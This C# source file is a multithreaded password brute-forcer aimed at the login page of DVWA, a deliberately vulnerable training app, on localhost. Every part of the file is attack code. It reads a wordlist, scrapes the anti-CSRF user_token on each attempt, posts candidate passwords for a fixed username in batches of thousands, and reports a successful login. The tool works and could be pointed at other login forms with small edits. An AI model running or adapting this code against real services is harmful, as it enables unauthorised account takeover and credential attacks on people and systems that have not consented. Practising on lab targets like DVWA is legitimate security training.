using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class BruteForceDVWA
{
  public static string Get(string url, ref CookieContainer cookies)
  {
    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
    req.Method = "GET";
    req.CookieContainer = cookies;


    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
    {
      cookies.Add(resp.Cookies);

      string pageSrc;
      using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
      {
        pageSrc = sr.ReadToEnd();
      }
      return pageSrc;
    }

  }

  public static string Post(string url, string postData, CookieContainer cookies, ref bool result)
  {
    string key = "Login failed";

    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
    req.Method = "POST";
    req.CookieContainer = cookies;
    req.ContentType = "application/x-www-form-urlencoded";

    Stream postStream = req.GetRequestStream();
    byte[] postBytes = Encoding.ASCII.GetBytes(postData);
    postStream.Write(postBytes, 0, postBytes.Length);
    postStream.Dispose();

    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
    {
      cookies.Add(resp.Cookies);

      StreamReader sr = new StreamReader(resp.GetResponseStream());
      string pageSrc = sr.ReadToEnd();
      sr.Dispose();
      //Console.WriteLine(pageSrc);
      result = !pageSrc.Contains(key);
      return pageSrc;
    }
  }
  static void CheckPassword(string pwd, ref bool tokenSource)
  {

    if (tokenSource)
    {
      System.Net.CookieContainer myCookies = new System.Net.CookieContainer();
      string myStr = Get("http://localhost/dvwa/login.php", ref myCookies);
      string token;
      if (myStr.Contains("user_token"))
      {
        token = GetBetween(myStr, "name='user_token' value='", "' />");

        Console.WriteLine(pwd);
        string postData = "username=" + "pablo" + "&password=" + pwd + "&Login=Login&user_token=" + token;
        bool result = false;
        string srcCode = Post("http://localhost/dvwa/login.php", postData, myCookies, ref result);

        if (result == true)
        {
          Console.WriteLine(srcCode);
          Console.WriteLine("Found password: " + pwd);
          tokenSource = false;
        }
      }


    }
  }


  static string GetBetween(string message, string start, string end)
  {
    int startIndex = message.IndexOf(start) + start.Length;
    int stopIndex = message.IndexOf(end);
    return message.Substring(startIndex, stopIndex - startIndex);
  }





  static void Main()
  {


    List<Task> taskList = new List<Task>();
    bool tokenSource = true;

    List<string> pwdList = new List<string>(File.ReadAllLines("pwdlist.txt"));
    Console.WriteLine("Checking " + pwdList.Count + " passwords...");
    int count = 0;
    foreach (string pwd in pwdList)
    {
      Task checkTask = new Task(() => CheckPassword(pwd, ref tokenSource));
      if (!tokenSource)
      {
        break;
      }
      checkTask.Start();
      taskList.Add(checkTask);
      count++;
      if (count == 5000)
      {
        count = 0;
        Thread.Sleep(1000);
      }


    }

    Task.WaitAll(taskList.ToArray());
    Console.WriteLine("Done checking all passwords.");

    Console.ReadKey();





  }





}